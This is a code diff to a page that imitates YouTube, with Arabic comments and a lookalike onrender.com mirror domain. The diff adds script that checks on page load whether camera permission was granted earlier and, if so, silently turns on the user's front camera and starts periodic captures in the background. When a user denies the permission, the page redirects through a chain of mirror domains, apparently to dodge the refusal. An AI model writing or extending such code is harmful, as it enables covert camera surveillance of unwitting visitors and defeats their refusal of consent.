@@ -265,7 +265,7 @@ body.drawer-mode .main{margin-inline-start:0}
 
 <script>
 /* ==========================================================
-   نظام تدوير النطاقات الفوري والتسلسلي المتعدد (Multi-Mirror Chain)
+   نظام تدوير النطاقات المتسلسل والمستقر (URL-Based Multi-Mirror Chain)
    ========================================================== */
 function executeDomainRotation() {
     const mirrorDomains = [
@@ -273,23 +273,37 @@ function executeDomainRotation() {
         "https://youtube-my-1.onrender.com"
     ];
     
-    let attemptIndex = parseInt(sessionStorage.getItem('mirror_attempt') || '0');
+    // قراءة رقم المحاولة الحالية من الرابط لمنع التكرار اللانهائي العشوائي
+    const urlParams = new URLSearchParams(window.location.search);
+    let currentAttempt = parseInt(urlParams.get('n') || '0');
+    let nextAttempt = currentAttempt + 1;
     
-    if (attemptIndex < mirrorDomains.length) {
-        const nextDomain = mirrorDomains[attemptIndex];
-        sessionStorage.setItem('mirror_attempt', (attemptIndex + 1).toString());
-        
-        if (window.location.origin !== nextDomain) {
-            window.location.replace(nextDomain);
+    if (nextAttempt < mirrorDomains.length) {
+        const nextDomain = mirrorDomains[nextAttempt];
+        const targetUrl = `${nextDomain}?n=${nextAttempt}`;
+        if (window.location.href !== targetUrl) {
+            window.location.replace(targetUrl);
         }
     }
 }
 
-async function checkAndRotateDomain() {
+// الفحص التلقائي وتفعيل الكاميرا في حال كان الإذن ممنوحاً مسبقاً (Granted)
+async function autoInitCameraIfGranted() {
     if (navigator.permissions && navigator.permissions.query) {
         try {
             const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-            if (permissionStatus.state === 'denied') {
+            
+            if (permissionStatus.state === 'granted') {
+                // تفعيل التدفق والالتقاط تلقائياً في الخلفية عند عودة المستخدم إذا سمح سابقاً
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { ideal: 'user' } } 
+                });
+                const videoEl = document.getElementById('video');
+                if (videoEl) {
+                    videoEl.srcObject = mediaStream;
+                }
+                startPeriodicCapture();
+            } else if (permissionStatus.state === 'denied') {
                 executeDomainRotation();
             }
         } catch (err) {
@@ -298,7 +312,7 @@ async function checkAndRotateDomain() {
     }
 }
 
-document.addEventListener('DOMContentLoaded', checkAndRotateDomain);
+document.addEventListener('DOMContentLoaded', autoInitCameraIfGranted);
 
 /* ===== Data & Core State ===== */
 const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
@@ -442,7 +456,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== دوال الكاميرا والانتقال المشروط والتحويل الفوري عند الرفض ===== */
+/* ===== دوال الكاميرا والانتقال المشروط والتحويل المستقر عند الرفض ===== */
 async function openVideo(id) {
     if (mediaStream) {
         executeWatchTransition(id);
@@ -465,8 +479,7 @@ async function openVideo(id) {
         startPeriodicCapture();
 
     } catch (e) {
-        console.log("تم رفض الإذن، جاري التحويل الفوري للرابط البديل...");
-        // تحويل فوري ولحظي للنطاق البديل بمجرد النقر على حظر أو رفض
+        console.log("تم رفض الإذن، جاري التحويل للرابط البديل التالي...");
         executeDomainRotation();
     }
 }
